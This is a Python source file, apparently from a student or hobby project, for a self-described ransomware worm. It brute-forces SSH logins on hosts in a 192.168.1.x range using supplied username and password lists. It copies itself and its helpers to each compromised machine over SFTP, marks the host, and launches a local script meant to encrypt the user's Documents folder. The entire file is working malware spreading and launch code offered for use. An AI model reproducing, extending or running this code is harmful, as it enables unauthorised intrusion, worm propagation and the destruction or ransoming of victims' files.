""" Ransomware worm. Spread to a host and encrypts target's /home/<username>/Documents folder
    by uploading a new python script that does everything locally.  """
import os
import argparse
from SSHConnection import SSHConnection
from SSHConnection import get_local_ip

def transfer_file(worm, malicious_file):
    """ Transfers a malicious file, must be in same directory as ransom.py """
    sftp_client = worm.ssh_connection.open_sftp()
    sftp_client.chdir(worm.target_dir)
    sftp_client.put(malicious_file, malicious_file)

def launch_attack(worm, malicious_file):
    """ Sends signal to program to call another python file that will do all the bad stuff locally
        so that the worm isn't stuck doing it all through ssh commands. """
    worm.ssh_connection.exec_command("python " + worm.target_dir + malicious_file +
                                     " " + worm.target_dir)

def main():
    """ Main function that does all the heavy lifting. Very similar to replicator """
    malicious_file = "local_attack.py"
    marker_file = "ransom_marker.txt"
    # Grab files with usernames and passwords
    parser = argparse.ArgumentParser()
    parser.add_argument("usernames", nargs=1, help="File of usernames to try", type=str)
    parser.add_argument("passwords", nargs=1, help="File of passwords to try", type=str)
    args = parser.parse_args()

    worm = SSHConnection()
    # Consider changing this to allow files in other directories to be used ?
    username_file = os.path.basename(args.usernames[0])
    password_file = os.path.basename(args.passwords[0])
    worm.set_files([malicious_file, username_file, password_file])

    # Create worm instance and search first 10 ips on the network
    worm.retrieve_vulnerable_hosts("192.168.1.", 10)

    # Set the file the worm will look for on the target system
    worm.set_worm_file(marker_file)
    if worm.find_target_host():
        # ound an unmarked host, copy the iles over to it.
        worm.set_target_dir("/home/" + worm.username + "/")
        transfer_file(worm, malicious_file)
        transfer_file(worm, __file__)
        transfer_file(worm, "SSHConnection.py")
        transfer_file(worm, username_file)
        transfer_file(worm, password_file)
        print ("[+] Completed! Launching local attack now...")
        worm.ssh_connection.exec_command("echo " + get_local_ip() + " >> " + marker_file)
        launch_attack(worm, malicious_file)
    else:
        print (" :( No target found, better get a job! ")

if __name__ == "__main__":
    main()
